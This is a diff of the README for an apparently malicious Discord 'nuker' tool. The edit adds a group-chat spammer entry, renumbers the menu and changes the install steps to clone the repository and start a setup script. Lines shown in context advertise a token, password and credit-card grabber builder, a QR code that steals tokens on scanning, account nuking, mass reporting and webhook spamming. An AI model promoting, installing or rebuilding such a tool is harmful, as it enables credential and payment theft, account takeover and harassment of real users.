@@ -22,7 +22,6 @@ code ✅
 * ` Many options while being compact`
 * ` Auto update`
 * ` Easy and fast`
-* ` No proxies needed!`
 * ` Linux Support!`
 * ` Nuke a targetted account`
 * ` Unfriend all friends`
@@ -38,6 +37,7 @@ code ✅
 * ` Create Token/Password/Creditcard Grabber`
 * ` Create Qr code that grabs their token upon scanning`
 * ` Mass report`
+* ` GroupChat Spammer`
 * ` Webhook destroyer`
 
 <p align="center">
@@ -168,11 +168,14 @@ Upon running the file you will get the following sent to your webhook:
 * Mass report a user of your choice
 * The account that will send the reports are the token that you put in
 
-#### [16] Webhook Destroyer
+#### [16] GroupChat Spammer
+* Mass create group chats with random users or chosen users
+
+#### [17] Webhook Destroyer
 * Choose between deleting or spamming a webhook
 * Can customize the Duration of spam and the message being sent
 
-#### [17] Exit
+#### [18] Exit
 * Exit the program
 > (press y to confirm exiting)
 
@@ -188,8 +191,7 @@ Upon running the file you will get the following sent to your webhook:
 ```
 git clone https://github.com/Rdimo/Hazard-Nuker.git
 cd Hazard-Nuker
-run install_requirements.cmd
-run run.bat
+start setup.bat
 ```
 
 #### 2nd・Installation (compiled)
